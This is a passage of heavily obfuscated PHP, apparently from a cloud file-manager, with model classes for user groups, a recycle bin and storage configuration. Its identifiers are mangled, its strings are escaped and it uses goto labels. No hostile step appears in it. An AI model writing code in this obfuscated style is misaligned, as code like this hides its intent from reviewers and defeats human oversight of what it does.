array($”ñ¦ŒÏñ[473], "\45{$Ôü×œü}\45")); $¡ı¦Óà† = $this->parseWhereLike($¡ı¦Óà†); if ($¾©ä´¬) { $¡ı¦Óà†[$”ñ¦ŒÏñ[1441]] = array($”ñ¦ŒÏñ[7], $¾©ä´¬); } $Ä¬÷ß¬Ò = Model($”ñ¦ŒÏñ[2229])->where($¡ı¦Óà†)->limit($¶üàì«Ù)->select(); if (!$Ä¬÷ß¬Ò) { return array(); } $Ä¬÷ß¬Ò = array_to_keyvalue($Ä¬÷ß¬Ò, $”ñ¦ŒÏñ[12], $”ñ¦ŒÏñ[1441]); $õ¨ö¨ãÁ = $this->where(array($”ñ¦ŒÏñ[2213] => array($”ñ¦ŒÏñ[7], $Ä¬÷ß¬Ò)))->select(); if (!$õ¨ö¨ãÁ) { return array(); } return $õ¨ö¨ãÁ; } protected function _listDataApplyItem($—¬û«š) { $Óª§á´™ = array($—¬û«š); $this->_listDataApply($Óª§á´™); return $Óª§á´™[0]; } protected function _listDataApply(&$ˆ”‹¦Æ´) { $ãÜ•šÕğ =& $_SERVER[€ä¾™²]; if (!$ˆ”‹¦Æ´) { return; } $Ğäó¿½€ = array_to_keyvalue($ˆ”‹¦Æ´, $ãÜ•šÕğ[12], $ãÜ•šÕğ[1441]); $this->_listAppendChildren($ˆ”‹¦Æ´); $this->_listAppendChildrenMember($ˆ”‹¦Æ´); $this->_listAppendMeta($ˆ”‹¦Æ´, $Ğäó¿½€); $this->_listAppendParent($ˆ”‹¦Æ´); $this->_listAppendSourceRoot($ˆ”‹¦Æ´, $Ğäó¿½€); } private function _listAppendChildren(&$¿â”€ì€) { $û‰æ¦š… =& $_SERVER[€ä¾™²]; $•ó½’“¢ = array_to_keyvalue($¿â”€ì€, $û‰æ¦š…[12], $û‰æ¦š…[1441]); $èÑÙ“Ôü = array($û‰æ¦š…[191] => array($û‰æ¦š…[7], $•ó½’“¢)); $íäñóáÍ = array($û‰æ¦š…[191], $û‰æ¦š…[2230] => $û‰æ¦š…[592]); $û¦«—˜¿ = $this->field($íäñóáÍ)->where($èÑÙ“Ôü)->group($û‰æ¦š…[191])->select(); $§¦ºà³â = array_to_keyvalue($û¦«—˜¿, $û‰æ¦š…[191], $û‰æ¦š…[592]); foreach ($¿â”€ì€ as &$Ø—™Ç¼Ñ) { $Üå¨³ = $Ø—™Ç¼Ñ[$û‰æ¦š…[1441]]; $Ø—™Ç¼Ñ[$û‰æ¦š…[2231]] = isset($§¦ºà³â[$Üå¨³]) ? intval($§¦ºà³â[$Üå¨³]) : !1; } unset($Ø—™Ç¼Ñ); } private function _listAppendChildrenMember(&$İ¤€ªä¿) { $áö™‚¨ =& $_SERVER[€ä¾™²]; $¼ğóæ = array_to_keyvalue($İ¤€ªä¿, $áö™‚¨[12], $áö™‚¨[1441]); $Ú¤ò®¨³ = array($áö™‚¨[1441] => array($áö™‚¨[7], $¼ğóæ)); $ñ‘¼  = array($áö™‚¨[1441], $áö™‚¨[2230] => $áö™‚¨[592]); $âÑèƒƒ‚ = Model($áö™‚¨[2220])->field($ñ‘¼ )->where($Ú¤ò®¨³)->group($áö™‚¨[1441])->select(); $Ğ•êË´Ÿ = array_to_keyvalue($âÑèƒƒ‚, $áö™‚¨[1441], $áö™‚¨[592]); foreach ($İ¤€ªä¿ as &$…ÑöºÙÒ) { $Í§Úğ¾¼ = $…ÑöºÙÒ[$áö™‚¨[1441]]; $…ÑöºÙÒ[$áö™‚¨[2232]] = isset($Ğ•êË´Ÿ[$Í§Úğ¾¼]) ? intval($Ğ•êË´Ÿ[$Í§Úğ¾¼]) : !1; } unset($…ÑöºÙÒ); } private function _listAppendMeta(&$˜ş†£Ò®, $î¶Ç†‰á) { $ïÏ–ê›« =& $_SERVER[€ä¾™²]; $íõúìØ» = array($ïÏ–ê›«[1441] => array($ïÏ–ê›«[7], $î¶Ç†‰á)); $úÌÖ‡©ş = Model($ïÏ–ê›«[2219])->where($íõúìØ»)->select(); $úÌÖ‡©ş = array_to_keyvalue_group($úÌÖ‡©ş, $ïÏ–ê›«[1441]); foreach ($úÌÖ‡©ş as &$Ç¬ß—±¾) { $Ç¬ß—±¾ = array_to_keyvalue($Ç¬ß—±¾, $ïÏ–ê›«[95], $ïÏ–ê›«[451]); } unset($Ç¬ß—±¾); foreach ($˜ş†£Ò® as &$±‘Â‹Ş…) { $±‘Â‹Ş…[$ïÏ–ê›«[562]] = array(); if (isset($úÌÖ‡©ş[$±‘Â‹Ş…[$ïÏ–ê›«[1441]]])) { $±‘Â‹Ş…[$ïÏ–ê›«[562]] = $úÌÖ‡©ş[$±‘Â‹Ş…[$ïÏ–ê›«[1441]]]; } } unset($±‘Â‹Ş…); } protected function parentLevelArray($²Ñ…¥öŸ) { $­‡ˆ®ÄÌ =& $_SERVER[€ä¾™²]; $²Ñ…¥öŸ = explode($­‡ˆ®ÄÌ[50], trim($²Ñ…¥öŸ, $­‡ˆ®ÄÌ[50])); $²Ñ…¥öŸ = array_remove_value($²Ñ…¥öŸ, $­‡ˆ®ÄÌ[229]); return $²Ñ…¥öŸ; } protected function parentInGroup($™ıÀÉ·, $Ûşõİä­) { $¨ÂÉŸ˜º =& $_SERVER[€ä¾™²]; $«Áë«ä = $this->getInfoSimple($™ıÀÉ·); if (!$«Áë«ä) { return !0; } $Å¹™åÎÓ = $this->parentLevelArray($«Áë«ä[$¨ÂÉŸ˜º[611]]); $Å¹™åÎÓ[] = $™ıÀÉ·; foreach ($Å¹™åÎÓ as $™ıÀÉ·) { if (in_array($™ıÀÉ· . $¨ÂÉŸ˜º[12], $Ûşõİä­)) { return !0; } } return !1; } private function _listAppendParent(&$ğöÆº¬) { $®½Á¹Œò =& $_SERVER[€ä¾™²]; $ó›ò…åÍ = array(); foreach ($ğöÆº¬ as &$¶ˆü™¿İ) { $ó›ò…åÍ[$¶ˆü™¿İ[$®½Á¹Œò[1441]]] = $¶ˆü™¿İ[$®½Á¹Œò[32]]; $êåÏ®¬ø = $this->parentLevelArray($¶ˆü™¿İ[$®½Á¹Œò[611]]); foreach ($êåÏ®¬ø as $©’á«©ë) { if (!isset($ó›ò…åÍ[$©’á«©ë])) { $ó›ò…åÍ[$©’á«©ë] = 0; } } } unset($¶ˆü™¿İ); foreach ($ó›ò…åÍ as $¹›òÍ‘° => $Ë¢±Š«š) { if ($Ë¢±Š«š) { continue; } $áŸœíç = $this->getInfoSimple($¹›òÍ‘°); $ó›ò…åÍ[$¹›òÍ‘°] = $áŸœíç[$®½Á¹Œò[32]]; } $ÁÜ÷‘´¼ = $GLOBALS[$®½Á¹Œò[6]][$®½Á¹Œò[92]][$®½Á¹Œò[2233]]; if (KodUser::isRoot()) { $ÁÜ÷‘´¼ = !1; } foreach ($ğöÆº¬ as &$¶ˆü™¿İ) { $êåÏ®¬ø = $this->parentLevelArray($¶ˆü™¿İ[$®½Á¹Œò[611]]); $¿ÅúÍÒØ = $®½Á¹Œò[12]; foreach ($êåÏ®¬ø as $¹›òÍ‘° => $©’á«©ë) { if ($ÁÜ÷‘´¼ && $¹›òÍ‘° == 0) { continue; } $¿ÅúÍÒØ .= $ó›ò…åÍ[$©’á«©ë] . $®½Á¹Œò[8]; } if ($êåÏ®¬ø) { $¿ÅúÍÒØ .= $¶ˆü™¿İ[$®½Á¹Œò[32]]; } $¶ˆü™¿İ[$®½Á¹Œò[616]] = str_replace($®½Á¹Œò[255], $®½Á¹Œò[8], $¿ÅúÍÒØ); } unset($¶ˆü™¿İ); } private function _listAppendSourceRoot(&$ôã™©¼­, $Ç£²¦¯ú) { $˜¢İ”ŠÛ =& $_SERVER[€ä¾™²]; $ÄÎ„ä¶ò = Model($˜¢İ”ŠÛ[932])->listSourceRoot(SourceModel::TYPE_GROUP, $Ç£²¦¯ú); $ÄÎ„ä¶ò = array_to_keyvalue($ÄÎ„ä¶ò, $˜¢İ”ŠÛ[596]); $ÄÎ„ä¶ò = array_remove_key($ÄÎ„ä¶ò, $˜¢İ”ŠÛ[596]); foreach ($ôã™©¼­ as &$Üƒ¨ññç) { $Üƒ¨ññç[$˜¢İ”ŠÛ[90]] = $ÄÎ„ä¶ò[$Üƒ¨ññç[$˜¢İ”ŠÛ[1441]]] ? $ÄÎ„ä¶ò[$Üƒ¨ññç[$˜¢İ”ŠÛ[1441]]] : array(); } unset($Üƒ¨ññç); } protected function groupMerge($Í›¥à¨ü) { $Í›¥à¨ü = array_values(array_unique($Í›¥à¨ü)); $ÉÂÎİ = array(); for ($Ü¹êïÖß = 0; $Ü¹êïÖß < count($Í›¥à¨ü); $Ü¹êïÖß++) { $×ÖóÒÌ½ = !1; for ($Âà…»î‘ = 0; $Âà…»î‘ < count($Í›¥à¨ü); $Âà…»î‘++) { if ($Ü¹êïÖß == $Âà…»î‘) { continue; } if ($this->isParentOf($Í›¥à¨ü[$Âà…»î‘], $Í›¥à¨ü[$Ü¹êïÖß])) { $×ÖóÒÌ½ = !0; break; } } if (!$×ÖóÒÌ½) { $ÉÂÎİ[] = $Í›¥à¨ü[$Ü¹êïÖß]; } } return $ÉÂÎİ; } protected function isParentOf($¿…ó¿ú¼, $„şÖÙ¯î) { $òı©È³ =& $_SERVER[€ä¾™²]; if (!$¿…ó¿ú¼ || !$„şÖÙ¯î || $¿…ó¿ú¼ == $„şÖÙ¯î) { return !1; } $¯Î³² = $this->getInfoSimple($¿…ó¿ú¼); $Û¡ÀÇÖ = $this->getInfoSimple($„şÖÙ¯î); $ú‚·‚Ïğ = $¯Î³²[$òı©È³[611]] . $¿…ó¿ú¼ . $òı©È³[50]; if (substr($Û¡ÀÇÖ[$òı©È³[611]], 0, strlen($ú‚·‚Ïğ)) == $ú‚·‚Ïğ) { return !0; } return !1; } public function groupShowRoot($Ü¦˜ÁÁ, $ªıª¥˜ = false) { $Ø¦­ÜÈæ =& $_SERVER[€ä¾™²]; $‰†‹ê†¹ = $this->getInfo($Ü¦˜ÁÁ); if (!$‰†‹ê†¹) { return array(); } $µ²ÂƒÆÛ = $this->parentLevelArray($‰†‹ê†¹[$Ø¦­ÜÈæ[611]]); $÷¦âñåá = array($Ü¦˜ÁÁ); if (count($µ²ÂƒÆÛ) == 0) { return $÷¦âñåá; } if ($ªıª¥˜ && count($µ²ÂƒÆÛ) == 1) { return $÷¦âñåá; } if (!$‰†‹ê†¹[$Ø¦­ÜÈæ[562]] || !isset($‰†‹ê†¹[$Ø¦­ÜÈæ[562]][$Ø¦­ÜÈæ[2214]]) || $‰†‹ê†¹[$Ø¦­ÜÈæ[562]][$Ø¦­ÜÈæ[2214]] == $Ø¦­ÜÈæ[879]) { return $this->groupShowRoot($µ²ÂƒÆÛ[count($µ²ÂƒÆÛ) - 1], $ªıª¥˜); } if ($‰†‹ê†¹[$Ø¦­ÜÈæ[562]][$Ø¦­ÜÈæ[2214]] == $Ø¦­ÜÈæ[433]) { $Éå¹äŞ÷ = explode($Ø¦­ÜÈæ[50], $‰†‹ê†¹[$Ø¦­ÜÈæ[562]][$Ø¦­ÜÈæ[2215]]); if ($Éå¹äŞ÷) { $÷¦âñåá = array_merge($÷¦âñåá, $Éå¹äŞ÷); } } return $÷¦âñåá; } protected function resetParentLevel() { $€‰¶µ…Ÿ =& $_SERVER[€ä¾™²]; $ªÃ¥«äû = $€‰¶µ…Ÿ[1441]; $‘™Óºíú = $this->select(); $‘™Óºíú = array_to_keyvalue($‘™Óºíú, $ªÃ¥«äû); foreach ($‘™Óºíú as $¶ü¹Ìó) { $Ç‡ÅÊïÛ = $¶ü¹Ìó; $ÄŞã‚Á = array(); while ($Ç‡ÅÊïÛ[$€‰¶µ…Ÿ[191]] != 0) { $ÄŞã‚Á[] = $Ç‡ÅÊïÛ[$€‰¶µ…Ÿ[191]]; $Ç‡ÅÊïÛ = $‘™Óºíú[$Ç‡ÅÊïÛ[$€‰¶µ…Ÿ[191]]]; } $ÄŞã‚Á[] = 0; $ÄŞã‚Á = $€‰¶µ…Ÿ[50] . implode($€‰¶µ…Ÿ[50], array_reverse($ÄŞã‚Á)) . $€‰¶µ…Ÿ[50]; $this->setNamePinyin($¶ü¹Ìó[$ªÃ¥«äû], $¶ü¹Ìó[$€‰¶µ…Ÿ[32]]); $this->where(array($ªÃ¥«äû => $¶ü¹Ìó[$ªÃ¥«äû]))->save(array($€‰¶µ…Ÿ[681] => $ÄŞã‚Á)); } return $‘™Óºíú; } public function groupNameAuto($·Ùûìä«, $–š¦òÆ) { $¸Ó¶ùãØ =& $_SERVER[€ä¾™²]; $½¡×ä“Œ = $this->where(array($¸Ó¶ùãØ[499] => $·Ùûìä«))->getField($¸Ó¶ùãØ[32], !0); if (!$½¡×ä“Œ || !in_array($–š¦òÆ, $½¡×ä“Œ)) { return $–š¦òÆ; } for ($ÊÈ­§š“ = 1; $ÊÈ­§š“ <= count($½¡×ä“Œ) + 1; $ÊÈ­§š“++) { $ÚÎ›´â = $–š¦òÆ . "\x28{$ÊÈ­§š“}\51"; if (!in_array($ÚÎ›´â, $½¡×ä“Œ)) { return $ÚÎ›´â; } } } public function groupSwitch($ôÄçº£, $µ—¤ã¼¿) { $ƒ†¹¤° =& $_SERVER[€ä¾™²]; $©ÄÁôÒó = array($ƒ†¹¤°[1441] => array($ƒ†¹¤°[7], array($ôÄçº£, $µ—¤ã¼¿))); $çĞ©úÈá = $this->where($©ÄÁôÒó)->select(); $çĞ©úÈá = array_to_keyvalue($çĞ©úÈá, $ƒ†¹¤°[1441]); $¦Ôê…ªŸ = _get($çĞ©úÈá, $ôÄçº£); $½Ğş¥§ = _get($çĞ©úÈá, $µ—¤ã¼¿); if (!$¦Ôê…ªŸ || !$½Ğş¥§ || $¦Ôê…ªŸ[$ƒ†¹¤°[191]] == 0) { return !1; } if ($¦Ôê…ªŸ[$ƒ†¹¤°[1441]] == $½Ğş¥§[$ƒ†¹¤°[1441]]) { return !1; } if (strpos($½Ğş¥§[$ƒ†¹¤°[611]], $¦Ôê…ªŸ[$ƒ†¹¤°[611]] . $¦Ôê…ªŸ[$ƒ†¹¤°[1441]] . $ƒ†¹¤°[50]) === 0) { return !1; } $©ÄÁôÒó = array($ƒ†¹¤°[1441] => $ôÄçº£); $±§éÕÌ¿ = Model($ƒ†¹¤°[2220])->where($©ÄÁôÒó)->select(); if (!$±§éÕÌ¿) { $±§éÕÌ¿ = array(); } foreach ($±§éÕÌ¿ as $ŠÕ¸¬ğ) { $™±ò«‰¾ = $ŠÕ¸¬ğ[$ƒ†¹¤°[1539]]; $©ÄÁôÒó = array($ƒ†¹¤°[1539] => $™±ò«‰¾, $ƒ†¹¤°[1441] => $µ—¤ã¼¿); $óõŞôëü = Model($ƒ†¹¤°[2220])->where($©ÄÁôÒó)->find(); if (!$óõŞôëü) { $ƒäÇ†şà = array($µ—¤ã¼¿ => $ŠÕ¸¬ğ[$ƒ†¹¤°[1586]]); Model($ƒ†¹¤°[624])->userGroupAdd($™±ò«‰¾, $ƒäÇ†şà); } Model($ƒ†¹¤°[624])->userGroupRemove($™±ò«‰¾, $ôÄçº£); } $©ÄÁôÒó = array($ƒ†¹¤°[189] => 2, $ƒ†¹¤°[191] => 0, $ƒ†¹¤°[507] => 1, $ƒ†¹¤°[596] => array($ƒ†¹¤°[7], array($ôÄçº£, $µ—¤ã¼¿))); $ûòªÈÍ™ = Model($ƒ†¹¤°[932])->where($©ÄÁôÒó)->field($ƒ†¹¤°[2234])->select(); $ûòªÈÍ™ = array_to_keyvalue($ûòªÈÍ™, $ƒ†¹¤°[596], $ƒ†¹¤°[192]); $ûÈÊæ¥ = !empty($ûòªÈÍ™[$ôÄçº£]) ? $ûòªÈÍ™[$ôÄçº£] : !1; if ($ûÈÊæ¥) { if (!$ûòªÈÍ™[$µ—¤ã¼¿]) { $ûòªÈÍ™[$µ—¤ã¼¿] = Model($ƒ†¹¤°[932])->groupRootAdd($µ—¤ã¼¿); } $¯´ÔÖè€ = $ûòªÈÍ™[$µ—¤ã¼¿]; $©ÄÁôÒó = array($ƒ†¹¤°[191] => $ûÈÊæ¥); $ûòªÈÍ™ = Model($ƒ†¹¤°[932])->where($©ÄÁôÒó)->field($ƒ†¹¤°[2235])->select(); if (!$ûòªÈÍ™) { $ûòªÈÍ™ = array(); } Model($ƒ†¹¤°[932])->moveClearAuth = !1; foreach ($ûòªÈÍ™ as $ï‰ÔÀ‰) { $íìïë®‡ = $ï‰ÔÀ‰[$ƒ†¹¤°[507]] == $ƒ†¹¤°[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ƒ†¹¤°[932])->move($ï‰ÔÀ‰[$ƒ†¹¤°[192]], $¯´ÔÖè€, $íìïë®‡); } Model($ƒ†¹¤°[932])->moveClearAuth = !0; $©ÄÁôÒó = array($ƒ†¹¤°[189] => 2, $ƒ†¹¤°[596] => $ôÄçº£); $„„µÏÉì = array($ƒ†¹¤°[596] => $µ—¤ã¼¿); Model($ƒ†¹¤°[2236])->where($©ÄÁôÒó)->save($„„µÏÉì); Model($ƒ†¹¤°[2237])->where($©ÄÁôÒó)->save($„„µÏÉì); } $this->_changeChildLevel($çĞ©úÈá[$ôÄçº£], $çĞ©úÈá[$µ—¤ã¼¿], !0); $this->where(array($ƒ†¹¤°[191] => $ôÄçº£))->save(array($ƒ†¹¤°[191] => $µ—¤ã¼¿)); $this->_clearChildrenCache($çĞ©úÈá[$µ—¤ã¼¿]); return !0; } } goto cäî©ÔÖœ·; dĞ‚Ñ•ô‘º: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\x72\143\x65\137\x72\145\x63\x79\143\154\x65"; protected $dataAuto = array(array("\143\162\145\141\164\145\x54\x69\155\145", "\x74\x69\155\145", "\151\x6e\x73\x65\x72\x74", "\x66\165\x6e\x63\x74\151\x6f\156")); public function listData($×¶şáåğ = false) { $÷ç…éã =& $_SERVER[€ä¾™²]; $×¶şáåğ = $×¶şáåğ ? $×¶şáåğ : USER_ID; $Ú‘²Ñ°ä = $this->where(array($÷ç…éã[1913] => $×¶şáåğ))->select(); return array_to_keyvalue($Ú‘²Ñ°ä, $÷ç…éã[12], $÷ç…éã[192]); } public function moveToRecycle($°€¤íâ) { $·–¢ƒô¼ =& $_SERVER[€ä¾™²]; $ƒéÂ§Œ¸ = Model($·–¢ƒô¼[1479]); $ë¶Éığô = $ƒéÂ§Œ¸->sourceInfo($°€¤íâ); if (!$ë¶Éığô || $ë¶Éığô[$·–¢ƒô¼[527]] == $·–¢ƒô¼[91]) { return; } $¿ø¿’¶Ë = array($·–¢ƒô¼[513] => $°€¤íâ, $·–¢ƒô¼[1913] => USER_ID, $·–¢ƒô¼[677] => $ë¶Éığô[$·–¢ƒô¼[189]], $·–¢ƒô¼[678] => $ë¶Éığô[$·–¢ƒô¼[596]], $·–¢ƒô¼[681] => $ë¶Éığô[$·–¢ƒô¼[611]]); $this->add($¿ø¿’¶Ë); $this->recycleMove($°€¤íâ, 1); if ($ë¶Éığô[$·–¢ƒô¼[507]] == $·–¢ƒô¼[91]) { $ĞĞ‚ŸóÍ = array($·–¢ƒô¼[681] => array($·–¢ƒô¼[642], $ë¶Éığô[$·–¢ƒô¼[611]] . $°€¤íâ . $·–¢ƒô¼[643])); $ƒéÂ§Œ¸->where($ĞĞ‚ŸóÍ)->setField($·–¢ƒô¼[527], 1); } } public function clear() { $this->remove(!1); } public function remove($È…şèöğ = false, $ºÍ®Ğ«‹ = false) { $ÓÁüú® =& $_SERVER[€ä¾™²]; $ºÍ®Ğ«‹ = $ºÍ®Ğ«‹ ? $ºÍ®Ğ«‹ : USER_ID; $§÷Ğ£îÑ = Model($ÓÁüú®[1479]); $ü”Š÷õ» = $this->listData($ºÍ®Ğ«‹); $È…şèöğ = $È…şèöğ === !1 ? !1 : $È…şèöğ; $·Í¿ôÍ = array(); foreach ($ü”Š÷õ» as $«ıÖ¯¯é) { if ($È…şèöğ != !1 && !in_array($«ıÖ¯¯é, $È…şèöğ)) { continue; } $ÎÆÊ÷°ı = $§÷Ğ£îÑ->sourceInfo($«ıÖ¯¯é); $§÷Ğ£îÑ->remove($«ıÖ¯¯é, !1); $¬…­§òÜ = $ÎÆÊ÷°ı[$ÓÁüú®[189]] . $ÓÁüú®[11] . $ÎÆÊ÷°ı[$ÓÁüú®[596]]; $·Í¿ôÍ[$¬…­§òÜ] = array($ÓÁüú®[677] => $ÎÆÊ÷°ı[$ÓÁüú®[189]], $ÓÁüú®[596] => $ÎÆÊ÷°ı[$ÓÁüú®[596]]); $this->where(array($ÓÁüú®[192] => $«ıÖ¯¯é))->delete(); } foreach ($·Í¿ôÍ as $Àİ¼£ì) { $§÷Ğ£îÑ->targetSpaceUpdate($Àİ¼£ì[$ÓÁüú®[189]], $Àİ¼£ì[$ÓÁüú®[596]]); } } public function restore($“ôª´™ = false) { $ê˜Û’©æ = $this->listData(); $this->_restoreSource($ê˜Û’©æ, $“ôª´™); } public function removeUserAll($­Õéğ‘Ç) { $this->remove(!1, $­Õéğ‘Ç); } public function restoreItem($¡Œ˜òÙ) { $this->_restoreSource(array($¡Œ˜òÙ), array($¡Œ˜òÙ)); } private function _restoreSource($è”ç¬Œ, $¬­ÚÇó) { $¤¡ÏÏ½é =& $_SERVER[€ä¾™²]; $·ÍÈãº = Model($¤¡ÏÏ½é[1479]); $¬­ÚÇó = $¬­ÚÇó == !1 ? !1 : $¬­ÚÇó; if (!$è”ç¬Œ) { return !0; } $­í¸ê³º = array(); foreach ($è”ç¬Œ as $ï×íô¬ß) { if ($¬­ÚÇó != !1 && !in_array($ï×íô¬ß, $¬­ÚÇó)) { continue; } $ÛÒü¹ = $·ÍÈãº->sourceInfo($ï×íô¬ß); $¦Î•‚ÖÂ = $·ÍÈãº->sourceInfo($ÛÒü¹[$¤¡ÏÏ½é[191]]); if ($¦Î•‚ÖÂ[$¤¡ÏÏ½é[527]] == $¤¡ÏÏ½é[91]) { continue; } $·ÍÈãº->lockMoveStart($ï×íô¬ß); $this->recycleMove($ï×íô¬ß, 0); if ($ÛÒü¹[$¤¡ÏÏ½é[507]] == $¤¡ÏÏ½é[91]) { $šîè´ªé = array($¤¡ÏÏ½é[681] => array($¤¡ÏÏ½é[642], $ÛÒü¹[$¤¡ÏÏ½é[611]] . $ï×íô¬ß . $¤¡ÏÏ½é[643])); $·ÍÈãº->where($šîè´ªé)->setField($¤¡ÏÏ½é[527], 0); $this->restoreFolderChildren($ï×íô¬ß, $è”ç¬Œ); } $this->where(array($¤¡ÏÏ½é[192] => $ï×íô¬ß))->delete(); $·ÍÈãº->folderSizeReset($ÛÒü¹[$¤¡ÏÏ½é[191]]); $­í¸ê³º[] = $ÛÒü¹[$¤¡ÏÏ½é[191]]; if ($ÛÒü¹[$¤¡ÏÏ½é[507]] == $¤¡ÏÏ½é[91]) { $­í¸ê³º[] = $ï×íô¬ß; } $·ÍÈãº->lockMoveEnd($ï×íô¬ß); } $·ÍÈãº->updateModifyTime($­í¸ê³º); } private function restoreFolderChildren($¤úÊİ, $¯”ÍÃö—) { $ƒİĞÉÊ‡ =& $_SERVER[€ä¾™²]; $§½ÏÈ×Š = Model($ƒİĞÉÊ‡[1479]); $Ï½òŒ­ = array($ƒİĞÉÊ‡[192] => array($ƒİĞÉÊ‡[7], array())); foreach ($¯”ÍÃö— as $ö„À‰è•) { if ($ö„À‰è• == $¤úÊİ) { continue; } if (!$§½ÏÈ×Š->isParentOf($¤úÊİ, $ö„À‰è•)) { continue; } $Òï°œÖÅ = $§½ÏÈ×Š->sourceInfo($ö„À‰è•); if ($Òï°œÖÅ[$ƒİĞÉÊ‡[507]] == $ƒİĞÉÊ‡[91]) { $Ï½òŒ­[] = array($ƒİĞÉÊ‡[681] => array($ƒİĞÉÊ‡[642], $Òï°œÖÅ[$ƒİĞÉÊ‡[611]] . $ö„À‰è• . $ƒİĞÉÊ‡[643])); } else { $Ï½òŒ­[$ƒİĞÉÊ‡[192]][1][] = $ö„À‰è•; } } if (!$Ï½òŒ­[$ƒİĞÉÊ‡[192]][1]) { unset($Ï½òŒ­[$ƒİĞÉÊ‡[192]]); } if (!$Ï½òŒ­) { return; } if (is_array($Ï½òŒ­[$ƒİĞÉÊ‡[192]]) && is_array($Ï½òŒ­[$ƒİĞÉÊ‡[192]][1])) { $Ï½òŒ­[$ƒİĞÉÊ‡[192]][1] = array_unique($Ï½òŒ­[$ƒİĞÉÊ‡[192]][1]); } $Ï½òŒ­[$ƒİĞÉÊ‡[1113]] = $ƒİĞÉÊ‡[2228]; $§½ÏÈ×Š->where($Ï½òŒ­)->setField($ƒİĞÉÊ‡[527], 1); } private function recycleMove($Éáš¯É, $…¾•«Æ = 1) { $âéŒÎİˆ =& $_SERVER[€ä¾™²]; $›Ö´°Úî = Model($âéŒÎİˆ[1479]); $ğËÁÂ©µ = Model($âéŒÎİˆ[2462]); $ÆæÂéÇŞ = array($âéŒÎİˆ[192] => $Éáš¯É); if ($…¾•«Æ) { $›Ö´°Úî->where($ÆæÂéÇŞ)->setField($âéŒÎİˆ[527], 1); $ğËÁÂ©µ->eventRecycle($Éáš¯É, $âéŒÎİˆ[2463]); } else { $§™Ü•Úì = $›Ö´°Úî->where($ÆæÂéÇŞ)->find(); $ˆ×šïêÜ = $§™Ü•Úì[$âéŒÎİˆ[507]] == $âéŒÎİˆ[91]; $İôÍœ»ë = $›Ö´°Úî->fileNameAuto($§™Ü•Úì[$âéŒÎİˆ[191]], $§™Ü•Úì[$âéŒÎİˆ[32]], REPEAT_RENAME_FOLDER, $ˆ×šïêÜ); if ($İôÍœ»ë != $§™Ü•Úì[$âéŒÎİˆ[32]]) { $›Ö´°Úî->rename($Éáš¯É, $İôÍœ»ë); } $›Ö´°Úî->where($ÆæÂéÇŞ)->setField($âéŒÎİˆ[527], 0); $ğËÁÂ©µ->eventRecycle($Éáš¯É, $âéŒÎİˆ[2464]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\163\x6f\x75\x72\x63\145\123\x65\143\x72\145\x74\114\151\x73\164"; public $field = array("\x73\157\165\162\x63\145\x49\104", "\x74\171\x70\x65\111\104", "\143\162\145\141\x74\145\125\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\163\x74\x6f\162\x61\x67\145\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\163\x69\x7a\145\115\141\170", "\x73\171\163\x74\x65\x6d", "\x64\145\146\141\x75\x6c\x74", "\144\x72\x69\x76\x65\162", "\143\x6f\156\x66\151\x67"); public function listData($ÎĞñõ¾ = false, $ª±šó± = "\x6d\x6f\144\x69\146\x79\x54\x69\155\x65", $€ÒÀåÀ¤ = false) { $«¶œÍÓ =& $_SERVER[€ä¾™²]; $Â€ÕÃ§ = parent::listData($ÎĞñõ¾, $ª±šó±, $€ÒÀåÀ¤); if ($ÎĞñõ¾) { return $Â€ÕÃ§; } $İŠûáô = array(); if ($GLOBALS[$«¶œÍÓ[2465]]) { $İŠûáô = $this->ioSizeUseGet(array_to_keyvalue($Â€ÕÃ§, $«¶œÍÓ[12], $«¶œÍÓ[486])); } foreach ($Â€ÕÃ§ as $Øó‰Ã«£ => $­Ù­ğ¡Š) { unset($Â€ÕÃ§[$Øó‰Ã«£][$«¶œÍÓ[6]]); $Â€ÕÃ§[$Øó‰Ã«£][$«¶œÍÓ[2117]] = isset($İŠûáô[$­Ù­ğ¡Š[$«¶œÍÓ[486]]]) ? $İŠûáô[$­Ù­ğ¡Š[$«¶œÍÓ[486]]] : 0; } return $Â€ÕÃ§; } public function ioSizeUseGet($‘Ğ–˜ê) { $Í÷‚Úáé =& $_SERVER[€ä¾™²]; if (!$‘Ğ–˜ê) { return array(); } $“Ğ¢ıîÂ = $Í÷‚Úáé[2466] . implode($Í÷‚Úáé[50], $‘Ğ–˜ê); $„äÛïïé = Cache::get($“Ğ¢ıîÂ); if ($„äÛïïé) { return $„äÛïïé; } $™ôÑ·ØÑ = array($Í÷‚Úáé[925] => $Í÷‚Úáé[486], $Í÷‚Úáé[2467] => $Í÷‚Úáé[79]); $ğÀş²Ã = array($Í÷‚Úáé[925] => array($Í÷‚Úáé[7], $‘Ğ–˜ê)); $„äÛïïé = Model($Í÷‚Úáé[893])->field($™ôÑ·ØÑ)->where($ğÀş²Ã)->group($Í÷‚Úáé[925])->select(); $„äÛïïé = array_to_keyvalue($„äÛïïé, $Í÷‚Úáé[486], $Í÷‚Úáé[79]); Cache::set($“Ğ¢ıîÂ, $„äÛïïé, 600); return $„äÛïïé; } public function getConfig($Ü„“ıÓ‹) { $ŒÂÌ®ƒÁ = parent::listData($Ü„“ıÓ‹); $¾­îàÑ = _get($ŒÂÌ®ƒÁ, $_SERVER[€ä¾™²][6], array()); if ($¾­îàÑ && !is_array($¾­îàÑ)) { $¾­îàÑ = json_decode($¾­îàÑ, !0); } return $¾­îàÑ; } public function update($™‰”ÇÜñ, $æ„àƒÂ•) { $Şİú…êÇ =& $_SERVER[€ä¾™²]; $ÏÃæ¸“© = $æ„àƒÂ•[$Şİú…êÇ[32]]; $‘×Àşó = array_to_keyvalue(parent::listData(), $Şİú…êÇ[32]); if (isset($‘×Àşó[$ÏÃæ¸“©]) && $‘×Àşó[$ÏÃæ¸“©][$Şİú…êÇ[486]] != $™‰”ÇÜñ) { return !1; } $this->checkPwd($™‰”ÇÜñ, $æ„àƒÂ•); if (isset($æ„àƒÂ•[$Şİú…êÇ[2468]]) && $æ„àƒÂ•[$Şİú…êÇ[2468]] == $Şİú…êÇ[91]) { $this->checkConfig($æ„àƒÂ•); } unset($æ„àƒÂ•[$Şİú…êÇ[2468]]); $¤¬µ†åÜ = parent::update($™‰”ÇÜñ, $æ„àƒÂ•); if 